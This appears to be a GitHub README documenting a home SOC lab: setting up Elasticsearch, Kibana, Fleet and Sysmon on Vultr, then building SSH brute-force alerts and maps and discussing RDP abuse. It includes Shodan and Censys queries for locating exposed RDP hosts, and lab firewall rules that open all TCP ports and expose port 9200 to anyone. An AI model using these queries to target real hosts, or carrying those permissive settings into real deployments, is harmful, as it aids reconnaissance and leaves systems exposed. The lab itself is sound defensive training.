# SOC-Analyst-Lab-using-ElasticSearch-and-Kibana

Elasticsearch is a distributed, open-source search and analytics engine designed for speed, scalability, and near real-time data processing. Built on Apache Lucene, it acts as a NoSQL, JSON-based document store used for full-text search, log analysis, and data visualization, often as the core component of the ELK Stack. 

## Objective

I have conducted a hands-on lab that goes over installing servers, including them on a VPN network, integrating them with Elastic search to be able to be used as a SIEM, system hardening, replicating an attack on both the attacker side and on the defence side withing the SIEM Environment. I will be setting up and configuring a VPC consisting of different servers and firewalls using VULTR. Below is a diagram of the project scope.

This is a a series of labs I have followed along with from [MyDFIR] on Youtube. His play list for this series is called [30-Day MYDFIR SOC Analyst Challenge]

**Source** [https://www.youtube.com/playlist?list=PLG6KGSNK4PuBb0OjyDIdACZnb8AoNBeq6]

### Skills gained across the lab

- Designing SOC network architecture (logical diagrams, VPCs, segmentation)
- SIEM setup and management with the ELK stack
- Writing detection rules and KQL queries
- Building security dashboards and visualizations
- Simulating and detecting brute force attacks (SSH/RDP)
- Understanding attacker tactics using a real C2 framework (Mythic)
- Incident response and ticket-driven case management with osTicket
- Practical cloud skills (Vultr, VM management, firewall configuration)

### Tools used throughout the lab

**SIEM & Log Management**

- Elasticsearch: storing and querying security logs
- Logstash: ingesting and processing log data
- Kibana: visualizing logs and building dashboards
- Sysmon: capturing endpoint events (process creation, network connections)
- Elastic Agent & Fleet Server: centralized agent management across hosts

**Cloud & Network Infrastructure**

- Vultr: cloud platform for hosting VMs
- Virtual Private Cloud (VPC): isolated, secure network environment
- Firewall rules: restricting access by IP and port
- SSH: secure remote access to Linux servers

**Threat Detection & Alerting**

- KQL (Kibana Query Language): filtering and searching logs
- Windows Event IDs: identifying specific security events (e.g. 4625 for failed logins)
- Custom alert rules: triggering notifications on brute force thresholds
- RDP & SSH monitoring: detecting failed and successful login attempts

**Attack Simulation (Red Team)**

- Kali Linux: attacker machine for running offensive tools
- Mythic C2 framework: command and control server for simulating real attacks
- Payload generation & callbacks: simulating malware delivery and exfiltration

**Incident Response & Case Management**

- osTicket: open-source ticketing system integrated with Elastic alerts
- Alert triage workflow: investigating, prioritizing, and resolving security incidents
- Logical network diagrams: documenting SOC lab architecture with draw.io

**Supporting Skills**

- Windows Server (RDP enabled) & Ubuntu Server (SSH enabled): target machines for attack simulation
- NTLM authentication concepts: understanding alternative attack vectors beyond brute force
- Threat lifecycle tracing: following an attack from initial access to post-exploitation in logs

# Steps Taken

## Building Ubuntu Server from VULTR (Virtual Network)

_Vultr: VPS Server and Network; I will start by installing an Ubuntu Server from VULTR and applying Elastic Search onto it._
- Vultr is a Global, automated cloud infrastructure from the broadest array of AMD and NVIDIA GPUs to virtual CPUs, bare metal, Kubernetes, storage, and networking.
- After making an account with VULTR, you will need to setup a VPN network, add a Server computer, and configure those together with a static IP, storage information, and applying an Ubuntu Server.
- You then Deploy and it will start building the Ubuntu Server
<img width="920" height="271" alt="Screenshot 2026-04-07 104456" src="https://github.com/user-attachments/assets/8fcde44c-a7a3-4550-8c38-2cef1775c4b6" />


## Install Elastic Search**

_Installing Elasticsearch on Ubuntu Server_
- We will be installing ElasticSearch via Powershell and SSH onto our hosted virtual machine from VULTR.
- Elasticsearch is a distributed, open-source search and analytics engine designed for speed, scalability, and near real-time data processing. Built on Apache Lucene, it acts as a NoSQL, JSON-based document store used for full-text search, log analysis, and data visualization, often as the core component of the ELK Stack.
<img width="976" height="468" alt="Screenshot 2026-04-07 104717" src="https://github.com/user-attachments/assets/75edae45-1362-4a5d-a6aa-0734b4437ff2" />

_Running SSH to our Hosted IP Address_
- We first wanna start by pointing our directory in Powershell over to our hosted Machine and it’s IP address.
- That can be found in the VULTUR environment under your dashboard.
<img width="911" height="58" alt="Screenshot 2026-04-07 104912" src="https://github.com/user-attachments/assets/575d1153-1863-473e-b640-79f1fd867929" />
- Next, we want to go get the download from ElasticSearch, copy the url from the download, and paste into Powershell using wget command to start the download on the actual hosted machine. (doing this for deb x86_64)
<img width="729" height="457" alt="Screenshot 2026-04-07 105037" src="https://github.com/user-attachments/assets/11e0068b-3d26-4039-9e09-35f5317ac260" />
<img width="773" height="87" alt="Screenshot 2026-04-07 105120" src="https://github.com/user-attachments/assets/351790a6-3263-442a-95d3-ebf67940be6e" />

_Installing and Starting Elastic Search Service_
- Once downloaded, we then run the installer, and then start the services. See image for script ran on Powershell (using ssh root@ipaddressofserver)

<img width="819" height="531" alt="Screenshot 2026-04-07 105505" src="https://github.com/user-attachments/assets/2b5ec018-6c03-4453-8ab2-79fcd0b97f9b" />

_Possible upgrade on Ubunto Server_
- An update may be needed for the Ubuntu Server
      
<img width="559" height="558" alt="Screenshot 2026-04-07 105505" src="https://github.com/user-attachments/assets/61755c07-8c1e-4f1e-a29d-dd01fe64bf9d" />

_Configuring IP address and Port for ElasticSearch_
- We run nano command to change these settings in Elasticsearch so it points to our hosted server.
    
<img width="739" height="472" alt="Screenshot 2026-04-07 105912" src="https://github.com/user-attachments/assets/235c9550-a6ca-4570-a161-da13e884713a" />

<img width="645" height="523" alt="Screenshot 2026-04-07 105956" src="https://github.com/user-attachments/assets/47113c19-2ecc-42d3-98ba-3e1469f46696" />

_Add a Firewall Group in VULTR_
- We then have to add a Firewall Group for our server to allow access for ElasticSearch
<img width="895" height="287" alt="Screenshot 2026-04-07 110103" src="https://github.com/user-attachments/assets/17dc0726-1949-4768-b4e7-e6c06dda2c7c" />

## Installing Kibana and setting up with Elasticsearch
- We will be installing Kibana via Powershell and SSH onto our hosted virtual machine from VULTR.
- Kibana is an open-source data visualization and exploration tool designed for the Elastic Stack (ELK Stack). 
- It acts as the user interface to search, analyze, and visualize data stored in Elasticsearch, allowing users to create interactive dashboards, charts, and maps to analyze log and time-series data.
<img width="464" height="407" alt="Screenshot 2026-04-07 110442" src="https://github.com/user-attachments/assets/dc66fb37-6888-4001-ab1d-ab342b3bcb6c" />

_Downloading Kibana and running_
- We want to Dowload Kibana from the site using DEB x86_64, and then running on our powershell connected to the Linux server
<img width="414" height="542" alt="Screenshot 2026-04-07 110503" src="https://github.com/user-attachments/assets/445f714c-8bf6-4378-a9ff-61dfb59c135b" />
<img width="842" height="343" alt="Screenshot 2026-04-07 110653" src="https://github.com/user-attachments/assets/6a500d3f-2fff-4039-93da-714c5788dca5" />

_Installing Kibana_
- We then install Kibana such as shown in image <img width="842" height="343" alt="Screenshot 2026-04-07 110653" src="https://github.com/user-attachments/assets/cd48e2da-6040-4fa3-aeb2-83df39cce009" />

_Changed IP address and Port for Kibana using Nano_
- Back in Nano, we have to change the IP address and Port for Kibana
<img width="809" height="354" alt="Screenshot 2026-04-07 110800" src="https://github.com/user-attachments/assets/af204074-a055-4cd9-a8d4-3863e0691704" />
- And select exit prompt for Nano, and save changes

_Started Kibana Service, then applied Token for Elasticsearch_
<img width="960" height="540" alt="Setting up Elastic SIEM on Network using VULTR" src="https://github.com/user-attachments/assets/8d9f8ad4-a6d6-42ed-a173-f096032a4acf" />
- Used Token (hiding under red) and entered into Elasticsearch login screen
<img width="960" height="540" alt="Setting up Elastic SIEM on Network using VULTR (1)" src="https://github.com/user-attachments/assets/0a15700d-21ab-4e63-9cee-afc696778982" />

_Configured Firewall to IP range using TCP and a range_
- Back in VULTUR, we wnet to Manage Firewall Group, and added a TCP protocol for a range of 1 - 65535
<img width="960" height="540" alt="Setting up Elastic SIEM on Network using VULTR (2)" src="https://github.com/user-attachments/assets/d05eb368-9335-44a9-a418-c4e004cd3855" />

_We can now use Elastic with Kibana_
<img width="960" height="540" alt="Setting up Elastic SIEM on Network using VULTR (3)" src="https://github.com/user-attachments/assets/44824b34-cecd-4ca9-a033-a1691d62fc4f" />

## Installing Windows Server
- For our entire network and Soc environment, we will want to setup a Windows Server, as most offices still use them as their main server for many systems and software to this day.
- See below as my example for setting this up.
<img width="888" height="418" alt="Screenshot 2026-04-07 150208" src="https://github.com/user-attachments/assets/29b2cc0c-fb62-4ad7-875d-fb58498350a5" />
<img width="942" height="476" alt="Screenshot 2026-04-07 150301" src="https://github.com/user-attachments/assets/d4aa0a49-ba19-4909-8fbc-5959c7957692" />
- Make sure it finishes installing, then login with the credentials set in VULTR
<img width="1063" height="480" alt="Screenshot 2026-04-07 150550" src="https://github.com/user-attachments/assets/ea630603-8331-402d-81f1-3029c71132f4" />

## Installing Fleet Server with Elastic Agent**

Elastic Agent is a single, unified, and lightweight software agent used to collect logs, metrics, traces, and security data from hosts (servers, containers, workstations) and send it to ElasticSearch. It replaces multiple specialized "Beats" (e.g., Filebeat, Metricbeat) with one tool, simplifying deployment, management, and security via a central console called Fleet.

The types of beats done in a system are:
- File Beat - Logs
- Metric Beat - Metrics
- Packet Beat - Network Data
- Winlog Beat - Windows Events
- Audit Beat - Windows Events
- Audit Beat - Audit Data
- Heartbeat Beat - Uptime

_Fleet Servers_
  
A Fleet Server is a component of the elastic Stack that acts as a centralized control plane for managing Elastic Agents. It enables administrators to remotely manage, configure, and update thousands of agents—which collect logs and metrics—from a   single Kibana Interface.

<img width="960" height="540" alt="Setting up Elastic SIEM on Network using VULTR (7)" src="https://github.com/user-attachments/assets/b0b2452b-28b9-402c-8e8c-17973fce205e" />

_Install Fleet Servers on VULTR_
- Install a new server with Ubunto, using our SOC network. You can use a machine with minimal cores and storage. Once installing, open up powershell and connect to the server via ‘SSH root@yournewipaddress’
<img width="960" height="540" alt="Setting up Elastic SIEM on Network using VULTR (8)" src="https://github.com/user-attachments/assets/528c28ff-95c5-47fc-9011-ac58d3297128" />

_Add Elastic on Fleet Servers_

<img width="960" height="540" alt="Setting up Elastic SIEM on Network using VULTR (9)" src="https://github.com/user-attachments/assets/d4b74a38-570b-4681-9a19-b24c9e5309e1" />

_Add install code from elastic to install on Fleet Server_
- Use the code for Linux 86_64 and paste into Powershell, directed to Fleet Server via SSH
<img width="960" height="540" alt="Setting up Elastic SIEM on Network using VULTR (10)" src="https://github.com/user-attachments/assets/91baf875-f82f-46dc-ae5e-6234cb80c52b" />

- We may need to run command ‘ufw allow 9200’, as well as  ‘ufw allow 8200’ and ‘ufw allow 443.
- We may also need to allow these ports via TCP on our Firewall in VULTR

<img width="960" height="540" alt="Setting up Elastic SIEM on Network using VULTR (11)" src="https://github.com/user-attachments/assets/0fd6458b-1f66-42d8-8c99-3107d06115e9" />

- We will want to add Elastic onto our newer Windows Server we made earlier.
- One adding agent, we copy the script for the Windows x86_64 option

<img width="960" height="540" alt="Setting up Elastic SIEM on Network using VULTR (12)" src="https://github.com/user-attachments/assets/e71c0bd8-fd98-4060-9948-c439e0fca123" />

- We then log into our Windows server, run PowerShell as Administrator, and run the code provide by elastic server.
- It will tell us when enrollment and data are confirmed.

<img width="960" height="540" alt="Setting up Elastic SIEM on Network using VULTR (13)" src="https://github.com/user-attachments/assets/a328d6b4-3d16-40d7-9428-46dd00675500" />

- On our Elastic Site, We can go to Analytics > Discover, and view our logs and data on our network we made so far.
- We can search for a server name, like the one for our Windows Server, then view associated logs and view information on the right.

<img width="960" height="540" alt="Setting up Elastic SIEM on Network using VULTR (14)" src="https://github.com/user-attachments/assets/d2d65ae8-7b7b-494a-b0ad-fb936012e4f6" />

## Sysmon Setup
Sysmon (System Monitor) is a Windows system service and device driver from Microsoft Sysinternals that provides advanced, real-time monitoring of system activity, including process creation, network creations, and file changes. It is designed for deep security visibility, helping detection teams identify malicious behavior and “living-off-the-land” attacks that standard Windows logs often miss.

_Key Features & Benefits_
- Detailed Process Tracking: Logs full command-line arguments for processes, including parent processes.
- File Hash Integrity: Records SHA1, MD5, or SHA256 hashes of process images to detect modified malware.
- Network Connections: Tracks TCP/UDP connections, including the source process, IP addresses, and ports.
- Advanced Detection: Detects file creation time changes (timestomping), driver loading, and raw disk access.
- Rule Filtering: Allows including or excluding specific events to reduce noise and optimize storage.

_Download Sysmon on Windows Server_
- You should be able to RDP into it via the IP address and password listed in VULTR
- Then, we can Download Latest Symon exe

<img width="798" height="493" alt="Screenshot 2026-04-07 153645" src="https://github.com/user-attachments/assets/48bf5079-2c5c-4d15-9266-01db77dc0ec0" />

- There is a Sysmon Configuration script we will need to add to the Sysmon installer. We can get that from Github. When we open that and go to ‘raw’, we can save as and then save it INTO the Sysmon download folder.

<img width="694" height="500" alt="Screenshot 2026-04-07 153713" src="https://github.com/user-attachments/assets/29051234-d58f-4010-96d7-81958f38ffdb" />

- We then run the exe from Powershell on the Windows Server machine.

<img width="736" height="534" alt="Screenshot 2026-04-07 153751" src="https://github.com/user-attachments/assets/beb547e5-4d7e-4e27-b2ca-b9f25c0d4698" />

- Once installed, we can see it is installed and running in Services.

<img width="650" height="503" alt="Screenshot 2026-04-07 153811" src="https://github.com/user-attachments/assets/8efb90a0-715c-4fc4-9a6e-9aa917413764" />

## ElasticSearch Ingest Data
Ingesting data into Elasticsearch involves collecting, transforming, and sending data to an index where it can be searched.
- Click on Add Integration
- Search for Custom Windows event log package

- The custom Windows event log package allows you to ingest events from any Windows event log
(external, opens in a new tab or window)
channel. You can get a list of available event log channels by running Get-WinEvent -ListLog * | Format-List -Property LogName
(external, opens in a new tab or window)
- in PowerShell on Windows Vista or newer. If Get-WinEvent is not available, Get-EventLog *

<img width="1905" height="954" alt="1_add_integrations" src="https://github.com/user-attachments/assets/82333f6a-4ef5-4e1c-b5ab-797bc39b291a" />
<img width="1352" height="518" alt="2_Windowscustomevenlogs_choose" src="https://github.com/user-attachments/assets/fad2a6f2-ec16-448e-8039-8d6518461205" />

_Windows Custom Field Mapping_
- here, we can review the fields that we wormally view from Windows event viewer. These fields and ID's are what we can use to search for them in our Elasticsearch to view logs and do analysis.
<img width="968" height="899" alt="3_FieldMappings" src="https://github.com/user-attachments/assets/b4dd2d06-a83c-4562-8139-26d01d75103e" />

_Add Event Logs integration_
- Enter in the fields needed for this integration
- Choose a name

<img width="958" height="791" alt="4_addintegrationfields" src="https://github.com/user-attachments/assets/e4609a56-6f53-45fb-bdb5-52736cd92c0f" />

- For the channel name, it SHOULD be the full name of the Sysmon Operation Logs found in Event Viewer, see image below.

<img width="988" height="684" alt="5_EventviewerSysmonlogs" src="https://github.com/user-attachments/assets/90096d83-679d-484d-8f8e-2eac17e68150" />

- We want to add this to an existing host - Choose our existing Windows Policy made previously in Elastic.

<img width="801" height="254" alt="6_Existinghost" src="https://github.com/user-attachments/assets/70c87ed9-8726-43be-8920-d985bccab511" />

_Research Windows Event ID’s we want_
- We then want to add another policy from our Windows Defender
- First, we wanna check some id’s we would want to include in our policy and log notifications

<img width="894" height="843" alt="8_WindowsEventViewerlog_id_1116" src="https://github.com/user-attachments/assets/dfb09e01-2c95-4012-a4c3-7c89188fcf6a" />
<img width="566" height="232" alt="8_WindowsEventViewerlog_id_5001" src="https://github.com/user-attachments/assets/f51f0581-0137-4cfc-8233-b537ff0bec31" />

- Then, test by disabling firewall on Windows Server

<img width="1187" height="621" alt="9_Disable_firewall_to_test_logs" src="https://github.com/user-attachments/assets/3e51883b-14a7-4b0c-828b-99f286bd001a" />

- Then, we wanna check event viewer to make sure we can get a 5001 notification.

<img width="635" height="299" alt="Screenshot 2026-04-07 165852" src="https://github.com/user-attachments/assets/3a8ba071-b264-452f-bf0b-c687fca7550c" />

- After that, re-enable firewall

## Add Windows Defender Integration
- Add new integration and enter in the approraiet fields

<img width="981" height="463" alt="7_Windows_SysmonAddedtoPolicy" src="https://github.com/user-attachments/assets/62e936b4-a641-42cd-baa6-3aced4cf9dae" />
<img width="843" height="616" alt="10_Start_addingWindefenderIntegration" src="https://github.com/user-attachments/assets/c8f84b5d-98d7-400c-9fca-ffa454f78ca6" />


- We are getting the channel name for the Windows Defender Operation Logs under Applications section in Event Viewer, and then clicking on properties to view name.
- Enter in the event id’s we want. In our case, enter 1116,1117,5001 (just like that with no spaces)

<img width="437" height="248" alt="10_addeventids" src="https://github.com/user-attachments/assets/0485ff7a-1e1f-4b1d-883b-c5faa0973a9e" />


- If you want to leave out an id, add a ‘-’ infront of that id.
- Add this integration to the existing Windows policy

<img width="433" height="127" alt="11_addtowindowspolicy" src="https://github.com/user-attachments/assets/6d5bc21a-6fa6-49ed-baa8-0d303bfc3d7b" />

- We now have our integrated Windows Policies

<img width="933" height="435" alt="12_we_have_our_integration_and_logs_pulled_from_window_server" src="https://github.com/user-attachments/assets/bf5d9e74-0ea0-4908-a9a3-cfcef0a307ea" />

_We may have to add TCP port 9200 to Anywhere in our Firewall set in VULTR_

<img width="1502" height="478" alt="15_add_Firewall_rule_9200" src="https://github.com/user-attachments/assets/55bfb396-bcf9-4ff6-843a-dd9679f30bc6" />

_Confirm we have live data coming into our Windows Server_
- In our Elastic Server site, click on the hamburger on the top left.
- Under Management section, click on Fleet
- We should be able to see we have CPU usage and memory for both Fleet Policies (one for Fleet Server and one for Windows Server)
- Click on our Windows Server policy
- We can see we have usage, memory, and that it is currently Healthy.

<img width="1225" height="899" alt="16_wenowhave_memoryandvalues" src="https://github.com/user-attachments/assets/e8fa15cd-5338-4fb1-8e81-00c02812e18a" />

_Finally, make sure we can view logs coming from our Windows Server's Event Viewer_.
- Click on the hamburger in the upper left
- Under Analytics section, click on Discover
- in the search bar above the graph, type in something like 'winlog.event_id: 1'
- Click on the arrows left of a tab.
- Click on the second page under document information.
- Then see we have event provider as Microsoft-Windows-Sysmon

<img width="1916" height="914" alt="17_Microsoft_Windows_sysmon_eventID_Dashboard" src="https://github.com/user-attachments/assets/1b71936e-673f-4a2c-97f3-c5e4d1b7c5ac" />

- Now, in the search, type in 'winlog.event_id: 5001'
- You may have to filter the calendar to include Today or the last week.
- We should have at least one record showing after waiting a bit.
- Click on the arrows to show documentation, then go to 2nd page and see our event provider is Microsoft-Windows-Windows Defender

<img width="1911" height="912" alt="18_Microsoft_Windows_windowsDefender_eventID_Dashboard" src="https://github.com/user-attachments/assets/2ec366b0-fe48-4e77-adc5-538b766406b2" />

_And Congrats! We have data coming into our ElasticServer, and we are ready to play around to view varoius events and information in our SIEM._

## Setup SSH Server and View Authentication Logs
- Create a new server in VULTUR
- Give in 1 GB memory and one RAM
- Choose your location
- Choose Ubunto (at this time selecting v25)

<img width="923" height="591" alt="1_installing_Ubuntu_onVULTR" src="https://github.com/user-attachments/assets/e08ea51d-28df-4249-b119-40206937a176" />

_Log into our Ubunto server via Powershell and SSH (SSH root@ipaddressofLinuxserver)_
- update our server by running 'apt-get update && apt-get -y

<img width="1054" height="794" alt="2_apt_get_update" src="https://github.com/user-attachments/assets/3f598000-a51e-41a9-a7ce-8e81e09eb596" />

<img width="1136" height="852" alt="3_varlogs" src="https://github.com/user-attachments/assets/d5a2adcf-af1a-4d37-b93a-fc4ae241f18d" />

_Activating logs on Ubuntu Server_
- Go to our directory for Var/Log, and then, run:

- cat auth.log
- This will eventually load up with logs showing failed authentications

<img width="827" height="208" alt="4runprompts_inorder_to_get_logs" src="https://github.com/user-attachments/assets/3a22281d-27af-43ca-8e5e-a9f4dd2e7362" />

## Install Elastic Agent on our newly added Linux Ubuntu Server
- We will want to create a new Fleet policy
<img width="1191" height="583" alt="1_Create_new_Fleet_Policy" src="https://github.com/user-attachments/assets/d771ab33-3ff6-49a2-a54f-0037618ce72f" />

<img width="1196" height="581" alt="2_Create_new_Fleet_Policy" src="https://github.com/user-attachments/assets/c8ee6bb1-5130-4c14-8576-ee4b32907a83" />

- Click on Integration Policy (for me, system 4)

<img width="1200" height="391" alt="3_click_on_integration_policy" src="https://github.com/user-attachments/assets/7951ee13-aca9-418e-8191-e01628b166c0" />


- We will need to access logs
- Linux authorization logs are critical for monitoring security events like failed login attempts, sudo usage, and SSH activity.
- The /var/log/auth.log file (on Debian/Ubuntu) or /var/log/secure (on RHEL/CentOS) is a critical Linux log that records all authorization-related events, including successful/failed login attempts, SSH connections, sudo usage, and user management actions. It is essential for monitoring security and detecting unauthorized access.

<img width="910" height="274" alt="4_Confirming_we_are_logging_for_authlog" src="https://github.com/user-attachments/assets/2d93c696-8b22-4ee1-bdf7-88d20cb9fd3c" />

_Adding a new Fleet Agent_
- Choose our newly added Linux Policy
- Choose Enroll in Fleet (Enroll in Elastic Agent in Fleet to automatically deploy updates and centrally manage the agent

<img width="455" height="754" alt="5_add_new_fleet_policy" src="https://github.com/user-attachments/assets/729ab80c-1f36-495a-931b-6bfd6502cf5c" />

- Select the Linux x86_64 option from the dropdown
- Copy the command (copu icon on upper-right of command)

<img width="451" height="690" alt="6_add_new_fleet_policy_chooseLinux_x86_64" src="https://github.com/user-attachments/assets/9918834f-29e9-4273-808d-be3d92a34e8f" />

- Head over to Powershell, type and enter 'CD' to back out of the var/log directorypaste command and hit enter.
- Paste the command and hit enter

<img width="971" height="399" alt="7_ElasticAgent_Policy_install" src="https://github.com/user-attachments/assets/42bde1c5-6231-47b6-b9aa-589f257e3e3f" />

- Hit Y for Yes to install as service

<img width="947" height="411" alt="9_ElasticAgent_Policy_instal_hityesl" src="https://github.com/user-attachments/assets/f656702c-c8a6-45ce-944a-15759b95d3d2" />

- During install, we get an Error: fail to execute request to fleet-server: x509

<img width="962" height="414" alt="10_error_ElasticAgent_Policy_instal_hityes" src="https://github.com/user-attachments/assets/6e3395b9-4da8-4c4e-aa84-d65fc05a96ba" />

- Ran again, and it finished installing

<img width="930" height="520" alt="13_installed correctly" src="https://github.com/user-attachments/assets/57a09a8d-0206-449e-a674-4477eb301f83" />
<img width="454" height="731" alt="14_installed correctly" src="https://github.com/user-attachments/assets/7d56cea5-713e-4a12-ba85-a4e04d3d74e4" />

- We confirmed we have logs coming through from our new Linux Ubunto Server

<img width="806" height="772" alt="15_conirmedwehave_data" src="https://github.com/user-attachments/assets/24cdda66-198c-42eb-b6ba-b81250e80596" />

- Clicking on the plus sign next to that server allows us to see logs in the table from our new Linux Server

<img width="806" height="772" alt="16" src="https://github.com/user-attachments/assets/6c4190d3-30c9-4db8-a87c-0880bdd11aeb" />
<img width="970" height="618" alt="17" src="https://github.com/user-attachments/assets/b487f03f-7cd1-48cb-b9cf-391c479c8740" />

- We now have more data and logs coming into our Ubuntu/Linux server

<img width="1894" height="903" alt="18" src="https://github.com/user-attachments/assets/dd06258b-5990-40f3-b5b5-3a92c06400ab" />

## Create SSH Brute Force Alert & Dashboard

<img width="1073" height="900" alt="1_ Review_activitylogs_onLinixServer" src="https://github.com/user-attachments/assets/a216e0a9-26a5-46cf-b82b-579c915e1144" />


_Check Dashboard for failed Athentications_
Now that we have our dashboard up, we want to look for failed authentications for brute force attacks. Some fields qwe are looking for are
- failed attempts
- user
- source ip address

<img width="1911" height="641" alt="2_Failed_attempt_logs" src="https://github.com/user-attachments/assets/0b0ce3e6-6a38-4ec5-ac99-d5ba611616f9" />

_Add Columns to dashboard to look for failed attempts_

To get some valid data regarding attemps made from questionable sources, we want to add columns (list of colums found on left under 'search field name), we want to add 'system.auth.ssh.event', username, source.ip, and the source.geo.country_name. We can now see failed attempts amde from these external sources.

<img width="1909" height="576" alt="Bring them all together now with failed attempts" src="https://github.com/user-attachments/assets/968a2961-6f64-4ad8-88b9-013770250c13" />
<img width="1905" height="750" alt="5_Source_IP_ _Coutnry_Name" src="https://github.com/user-attachments/assets/3b894fab-5669-439b-b25e-19b29805d8a4" />
<img width="1322" height="651" alt="4_usernames_logs" src="https://github.com/user-attachments/assets/4a7f6a99-265e-4ae6-8306-764365ed194c" />
<img width="1304" height="552" alt="3_system_auth_Failed_logs" src="https://github.com/user-attachments/assets/43b42479-0d4c-45f0-ab8b-10c688fc87b2" />

- Let's save our SSH Search Activity

<img width="1349" height="777" alt="7_save_our_SSH_Search_Activity_Search" src="https://github.com/user-attachments/assets/db2ee7f9-42a7-449f-8ad3-3637b66fc01a" />

_Create an Alert for failed SSH Attempts_

Let's now create an alert showing failed ssh attempts within the last 5 minutes, and then test the query.

<img width="1338" height="891" alt="8_Create_an_alert_andtest_quesry" src="https://github.com/user-attachments/assets/d05b44e6-8d72-4405-97ca-133db411618d" />
<img width="617" height="860" alt="9_Test_query" src="https://github.com/user-attachments/assets/0788d3e3-4ca6-4e1d-ae96-fd3099fa8ea9" />

- We have 22 attempts loged in the last 5 minutes for our alert
- Select Next
- We are going to skip the Actions section for now and keep the alert simple.
- Give the Alert rule a name, then select 'Create rule'

<img width="626" height="810" alt="10_Give_rule_name_and_select_create" src="https://github.com/user-attachments/assets/7164c4c4-1b64-4ce7-a3f5-5ceb462508be" />

_Create a Dashboard to Visualize where these attacks are sourcing from_

- Click on hamburger icon on top left of dashboard
- Under Analytics sections, click on maps
- See sections that says 'Filter your data using KQL syntax'
- Go back to our dashboard quickly and copy our query we used:

<img width="1626" height="133" alt="11_Copy_query_we_had_on_dashboard" src="https://github.com/user-attachments/assets/e889ee4d-40b1-4665-8bfe-1f596652c993" />

- bring over to a notepad and combine that query with failed attempts, user, and source ip coulumns, as such:
system.auth.ssh.event : * and agent.name: MYSOCENV-Linux and system.auth.ssh.event: Failed
- Hit enter to validate that it returns with logs
- copy that query
- Head back over to Maps under Analytics section
- Paste that search query we just copied
- content will not show on map yet

<img width="1309" height="601" alt="12_enter_query_in_maps_section" src="https://github.com/user-attachments/assets/fc45d002-c8ff-4b83-b8d2-191fdf5527eb" />

- Let's add a layer by choosing Chlorepleth (shaes areas to compare statistics across boundaries)
- We can choose from administrative boundaries from the Elastic Maps Service, OR, points, lines, and polygons  from Elastic Search. For this lab, we will choose Administrative boundaries and select World Countries.
- Keep the Join Field as defulted
- For Data view, we wanna use what we were using for the dashboard.
- Confirm we have the same dataview from dashboard

<img width="496" height="515" alt="14_DataView" src="https://github.com/user-attachments/assets/f6567de5-f1bf-462d-b7ef-684c205c09fd" />

- Then, select that option as the data view
- Then for join field, we will want to select 'source.geo.country_iso_code'. We don't want to use Country name, as we will likely get following error:

_An error occurred when adding join metrics to layer features

Left field values do not match right field values. Left field: 'ISO 3166-1 alpha-2 code' has values: AD,AE,AF,AG,AI (5 of 500). Right field: 'source.geo.country_name' has values: Romania,The Netherlands,United States,Netherlands,Luxembourg (5 of 23)._

-The Join Field (ISO 3166-1 alpha-2 code) wants the abbreviated name for this.

- Select 'Add and continue' for the map

<img width="1917" height="877" alt="15_Add_and_continue_map" src="https://github.com/user-attachments/assets/4e21de04-de1b-462d-8023-5f5956022100" />

- Review Layer Settings. For this lab, For this instance, we can leave these as defaulted.

<img width="448" height="663" alt="16_layer_Settings" src="https://github.com/user-attachments/assets/40cfe308-5e28-4a47-89b3-7026f26219d6" />

- Click on Save on top right
- Give the map a title, like SSH Network Map, and save to Dashboard.

- In the dashbaord, give it a name, and you can sift through the time to see the countries change it colors. We can see a lot of attacks from China, and definately Romania.

-Give the map a name as well, like "SSH Failed Authentication - Network Map"

<img width="1912" height="637" alt="18_Save_to_dashboard_edit_time_Analyze_where_attacks_are_coming_from" src="https://github.com/user-attachments/assets/ef51c717-f076-4c30-80ab-adb0d03c45bb" />

_Make another map showing Successful authentications_
- Make another map/dashboard by duplicating this one (three dots on upper right). Give it a name like SSH Successful Authentications, and apply.
- Change the query at the very end to read "Accepted" instead of "Failed"

<img width="1314" height="628" alt="Accepted_SSH_Map" src="https://github.com/user-attachments/assets/3d26b504-df5d-45b1-9b58-e8a9c753b490" />

- Select Save and Return

_Comapre our two maps_
- We have thousands of failed attemps coming from various countries and foreign ip's, 
- and we have only 3 successful SSH attempts coming from the USA.
- Select Save to complete the dashboard.

<img width="1443" height="868" alt="Screenshot 2026-04-13 173720" src="https://github.com/user-attachments/assets/b6a13b03-a117-4fae-8445-f521626ca21f" />

**_Congratulations! We now have an alert and an affective dashboard!_**
_We can now be alerted the next time a brute force attack occurs, and we can view where these are sourcing from._

## Remote Desktop Protocol

_RDP was abused in over 90% of cyber attacks_
In this section, we will learn about RDP, why it is used, how attackers abuse it, how to find endpoints with exposed RDP and how you can protect yourself.

### What is it?
- Remote Desktop Protocol is used for communication between Terminal Server and the Terminal Server client. RDP is encapsulated and encrypted within TCP and has a default port of 3389/TCP.
- It can be used remotely to connect to another machine.

### How does it get abused?
- An attacker can gain entry into a network or an environment through an exposed RDP service to a server.
- Once they have access, they can perform credential dumping to gather valid credentials found on that server, then, use those credentials to move laterraly onto other servers or machines withing the same network using RDP.
- They can also conduct data exfiltration, ransomware, or both.

### How to find Exposed RDP Servers
_Shodan_
- Shodan is a specialized search engine that crawls the internet to index devices, servers, and systems—such as webcams, routers, and industrial control systems—rather than webpages.
- As an example, On Shodan, once we type in 'port:3389' onto the search, it gives us data showing that there are over 2,500,000 RDP instances where the default 3389 port is set as open!

<img width="1149" height="676" alt="Shodan_port3389_search" src="https://github.com/user-attachments/assets/a108568e-5671-41cb-afa5-cb539cbee9cf" />

_Censys_
- Censys is a cybersecurity platform that continuously scans and maps the entire internet to identify, monitor, and analyze publicly accessible devices, domains, and certificates.
- We can enter a search query to view exposed RDP sessions and their host IP address by entering "host.services: (port: 3389 and protocol: "RDP") "

<img width="1629" height="871" alt="2_Sensys_Search" src="https://github.com/user-attachments/assets/4ad58634-b5e2-448b-b435-bf627620a278" />

- We can then click onto an individual RDP session. We can see if it is secure or not, and the specefics of the connection. Using this site can help us identify assets with potentially sensitive services that are exposed to the internet. Knowing these can help us reduce the risk of potential compromise.

<img width="1895" height="820" alt="3_Sensys_Search" src="https://github.com/user-attachments/assets/b69a68c4-88e0-481e-8436-dc8d000a2001" />

This result below is potentially an example of a bad RDP instance since the browser is not trusted, and perhaps they are using HTTP for a login page in a network.

<img width="878" height="756" alt="4_Sensys_Search" src="https://github.com/user-attachments/assets/e42a3236-017d-4bce-945a-38150d8e2df1" />

### How to Protect Yourself

1) Turn it off. Often, developer tend to use RDP to remote into servers to review or make code on a server, in SQL, or something else, then fogot to turn off the session when they are done.

2) Use Multifactor Authentication

3) Restrict Access. Implement firewall rules to restrict access to indivuals outside an environment or domain, so onlt the ones inside can RDP.

